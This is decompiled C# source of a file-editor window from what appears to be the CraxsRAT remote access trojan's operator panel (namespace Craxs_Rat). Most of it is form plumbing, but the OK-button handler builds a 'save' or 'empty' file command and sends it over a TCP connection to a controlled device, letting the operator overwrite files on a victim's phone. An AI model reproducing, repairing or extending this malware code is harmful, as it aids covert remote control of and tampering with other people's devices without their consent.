using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000B5 RID: 181
	[DesignerGenerated]
	public partial class Editor : Form
	{
		// Token: 0x06000C04 RID: 3076 RVA: 0x0007E49C File Offset: 0x0007C69C
		public Editor()
		{
			base.Load += this.Editor_Load;
			base.Activated += this.Editor_Activated;
			this.string_0 = null;
			this.string_1 = "null";
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x17000370 RID: 880
		// (get) Token: 0x06000C07 RID: 3079 RVA: 0x000064B4 File Offset: 0x000046B4
		// (set) Token: 0x06000C08 RID: 3080 RVA: 0x0007E97C File Offset: 0x0007CB7C
		internal virtual RichTextBox EditText
		{
			[CompilerGenerated]
			get
			{
				return this._EditText;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.EditText_TextChanged);
				RichTextBox editText = this._EditText;
				if (editText != null)
				{
					editText.TextChanged -= value2;
				}
				this._EditText = value;
				editText = this._EditText;
				if (editText != null)
				{
					editText.TextChanged += value2;
				}
			}
		}

		// Token: 0x17000371 RID: 881
		// (get) Token: 0x06000C09 RID: 3081 RVA: 0x000064BC File Offset: 0x000046BC
		// (set) Token: 0x06000C0A RID: 3082 RVA: 0x0007E9C0 File Offset: 0x0007CBC0
		internal virtual Button b_ok
		{
			[CompilerGenerated]
			get
			{
				return this._b_ok;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.b_ok_Click);
				Button b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click -= value2;
				}
				this._b_ok = value;
				b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click += value2;
				}
			}
		}

		// Token: 0x17000372 RID: 882
		// (get) Token: 0x06000C0B RID: 3083 RVA: 0x000064C4 File Offset: 0x000046C4
		// (set) Token: 0x06000C0C RID: 3084 RVA: 0x0007EA04 File Offset: 0x0007CC04
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000377 RID: 887
		// (get) Token: 0x06000C0D RID: 3085 RVA: 0x000064CC File Offset: 0x000046CC
		// (set) Token: 0x06000C0E RID: 3086 RVA: 0x0007EA18 File Offset: 0x0007CC18
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000373 RID: 883
		// (get) Token: 0x06000C0F RID: 3087 RVA: 0x000064D4 File Offset: 0x000046D4
		// (set) Token: 0x06000C10 RID: 3088 RVA: 0x0007EA5C File Offset: 0x0007CC5C
		internal virtual ContextMenuStrip CMenu { get; set; }

		// Token: 0x17000374 RID: 884
		// (get) Token: 0x06000C11 RID: 3089 RVA: 0x000064DC File Offset: 0x000046DC
		// (set) Token: 0x06000C12 RID: 3090 RVA: 0x0007EA70 File Offset: 0x0007CC70
		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem_Click);
				ToolStripMenuItem cutToolStripMenuItem = this._CutToolStripMenuItem;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem = value;
				cutToolStripMenuItem = this._CutToolStripMenuItem;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000375 RID: 885
		// (get) Token: 0x06000C13 RID: 3091 RVA: 0x000064E4 File Offset: 0x000046E4
		// (set) Token: 0x06000C14 RID: 3092 RVA: 0x0007EAB4 File Offset: 0x0007CCB4
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000376 RID: 886
		// (get) Token: 0x06000C15 RID: 3093 RVA: 0x000064EC File Offset: 0x000046EC
		// (set) Token: 0x06000C16 RID: 3094 RVA: 0x0007EAF8 File Offset: 0x0007CCF8
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				ToolStripMenuItem pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000C17 RID: 3095 RVA: 0x0007EB3C File Offset: 0x0007CD3C
		private void method_0()
		{
			try
			{
				foreach (Button button in this.Panel1.Controls.OfType<Button>())
				{
					button.BackColor = Module5.White;
					button.ForeColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Button> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			try
			{
				foreach (RichTextBox richTextBox in base.Controls.OfType<RichTextBox>())
				{
					richTextBox.ForeColor = Module5.White;
					richTextBox.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<RichTextBox> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			try
			{
				foreach (Panel panel in base.Controls.OfType<Panel>())
				{
					panel.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Panel> enumerator3;
				if (enumerator3 != null)
				{
					enumerator3.Dispose();
				}
			}
		}

		// Token: 0x06000C18 RID: 3096 RVA: 0x0007EC4C File Offset: 0x0007CE4C
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06000C19 RID: 3097 RVA: 0x0007EC94 File Offset: 0x0007CE94
		private void Editor_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\8.ico");
			this.method_0();
			this.CMenu.Renderer = new GClass12();
			this.EditText.ContextMenuStrip = this.CMenu;
			this.Text = this.string_1;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000C1A RID: 3098 RVA: 0x0007ED0C File Offset: 0x0007CF0C
		private void EditText_TextChanged(object sender, EventArgs e)
		{
			if (!this.b_ok.Visible & this.bool_0)
			{
				this.b_ok.Visible = true;
			}
		}

		// Token: 0x06000C1B RID: 3099 RVA: 0x0007ED3C File Offset: 0x0007CF3C
		private void Editor_Activated(object sender, EventArgs e)
		{
			this.bool_0 = true;
		}

		// Token: 0x06000C1C RID: 3100 RVA: 0x0007ED50 File Offset: 0x0007CF50
		private void b_ok_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null & Operators.CompareString(this.string_0, null, false) != 0)
			{
				object[] objects_;
				if (this.EditText.Text.Length > 0)
				{
					objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".files",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_40,
							GClass9.string_0,
							"save",
							GClass9.string_1,
							this.string_0,
							GClass9.string_1,
							this.EditText.Text
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
				}
				else
				{
					objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".files",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_40,
							GClass9.string_0,
							"empty",
							GClass9.string_1,
							this.string_0
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
				}
				this.gclass8_0.method_2(objects_);
				base.Close();
			}
		}

		// Token: 0x06000C1D RID: 3101 RVA: 0x0007EF00 File Offset: 0x0007D100
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Cut();
		}

		// Token: 0x06000C1E RID: 3102 RVA: 0x0007EF18 File Offset: 0x0007D118
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Copy();
		}

		// Token: 0x06000C1F RID: 3103 RVA: 0x0007EF30 File Offset: 0x0007D130
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Paste();
		}

		// Token: 0x040006BA RID: 1722
		public TcpClient tcpClient_0;

		// Token: 0x040006BB RID: 1723
		public GClass8 gclass8_0;

		// Token: 0x040006BC RID: 1724
		public bool bool_0;

		// Token: 0x040006BD RID: 1725
		public string string_0;

		// Token: 0x040006BE RID: 1726
		public string string_1;
	}
}
